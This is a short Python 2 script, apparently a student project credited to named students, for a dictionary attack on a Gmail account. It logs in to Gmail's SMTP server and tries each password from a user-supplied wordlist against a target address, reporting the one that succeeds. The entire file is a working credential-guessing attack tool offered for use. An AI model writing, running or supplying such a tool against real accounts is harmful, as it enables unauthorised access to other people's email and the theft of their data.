'''
A python program to do a dictionary attack on a gmail email account using a given word-list
Program by HIT ISA Students: John Chakauya, Gerald Gobvu, Rutendo Bingura, Blessing Njekezana and Neville Mahove
'''

import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587) #initialising the gmail smtp server
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter the target's gmail email address: ")
passwfile = raw_input("Enter the password word-list file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)
		print "[+] Password Found: %s" % password
		break;
	# except smtplib.SMTPAuntheticationError:
	except smtplib.SMTPException:
		print "[!] Password Incorrect: %s" % password

